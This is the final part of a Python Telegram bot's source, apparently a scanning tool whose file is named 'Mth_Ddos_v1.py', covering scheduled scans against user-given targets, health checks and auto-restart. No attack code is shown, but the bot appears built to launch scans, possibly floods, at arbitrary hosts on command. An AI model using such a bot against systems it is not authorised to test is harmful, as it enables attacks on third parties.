                            print(f"[Schedule Error] broadcast: {e}")
                    else:
                        # Regular scan
                        tool_fn = tool_map.get(cmd)
                        if tool_fn:
                            try:
                                send_message_safe(str(chat_id), f"⏰ <b>Scan agendado executando:</b> /{cmd} {escape_html(extract_hostname(target))}")
                                result = tool_fn(target)
                                send_message_safe(str(chat_id), result)
                                db_cache_set(cmd, target, result)
                            except Exception as e:
                                send_message_safe(str(chat_id), f"❌ Erro no scan agendado: {escape_html(str(e))}")
                        else:
                            send_message_safe(str(chat_id), f"❌ Comando /{cmd} não suportado em scans agendados.")

                    # Mark as completed
                    c.execute("UPDATE scheduled_tasks SET status = 'completed' WHERE id = ?", (t['id'],))
                    conn.commit()

            # Cleanup old completed tasks (older than 24h)
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM scheduled_tasks WHERE status = 'completed' AND scheduled_time < ?", (now - 86400,))
                conn.commit()
        except Exception as e:
            print(f"[Scheduled Task Error] {e}")


def health_check_loop():
    """Background thread that checks bot health every 5 minutes and logs"""
    global SHUTDOWN_FLAG
    while not SHUTDOWN_FLAG:
        time.sleep(300)  # 5 minutes
        if SHUTDOWN_FLAG:
            break
        try:
            # Quick health check
            resp = HTTP_SESSION.get(f"{API_URL}/getMe", timeout=10)
            if resp.status_code != 200:
                log_error("health", f"API unreachable (status {resp.status_code})")
            else:
                uptime_secs = int(time.time() - BOT_START_TIME)
                hours = uptime_secs // 3600
                print(f"[Health] OK | Uptime: {hours}h | Users: {len(USER_CMD_COUNT)} active | Cache: {len(RESULT_CACHE)} | Threads: {threading.active_count()}")
        except Exception as e:
            log_error("health", str(e))


def run_with_restart():
    """Run long_polling with auto-restart on crash"""
    restart_count = 0
    max_restarts = 10  # Max 10 restarts before giving up

    while restart_count < max_restarts and not SHUTDOWN_FLAG:
        try:
            print(f"[Restart] Starting bot (attempt {restart_count + 1}/{max_restarts})")
            long_polling()
        except Exception as e:
            log_error("restart", f"Bot crashed: {e}")
            print(f"[Restart] Bot crashed: {e}")

        if not SHUTDOWN_FLAG and restart_count < max_restarts - 1:
            restart_count += 1
            wait_time = min(30 * restart_count, 300)  # Backoff: 30s, 60s, 90s...
            print(f"[Restart] Restarting in {wait_time}s...")
            time.sleep(wait_time)
        else:
            break

    if restart_count >= max_restarts:
        print(f"[Restart] Max restarts reached ({max_restarts}). Stopping.")
        log_error("restart", f"Max restarts reached ({max_restarts})")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "webhook" and len(sys.argv) > 2:
            set_webhook(sys.argv[2])
        elif sys.argv[1] == "polling":
            # Start health check in background
            health_thread = threading.Thread(target=health_check_loop, daemon=True)
            health_thread.start()
            # V5.0: Start site monitor and scheduled task threads
            monitor_thread = threading.Thread(target=site_monitor_loop, daemon=True)
            monitor_thread.start()
            sched_thread = threading.Thread(target=scheduled_task_loop, daemon=True)
            sched_thread.start()
            # Start bot with auto-restart
            run_with_restart()
        elif sys.argv[1] == "test":
            print("MTH Security v5.1")
            print(f"Owners: {OWNERS}")
            print(f"DB: {DB_PATH}")
            stats = get_user_stats()
            print(f"Users: {stats['total']} | Commands: {stats['commands']}")
        else:
            print('Usage: python3 Mth_Ddos_v1.py [polling|webhook <url>|test]')
    else:
        print('Usage: python3 Mth_Ddos_v1.py [polling|webhook <url>|test]')
        print("Default: long polling mode")
        # Start health check in background
        health_thread = threading.Thread(target=health_check_loop, daemon=True)
        health_thread.start()
        # Start bot with auto-restart
        run_with_restart()
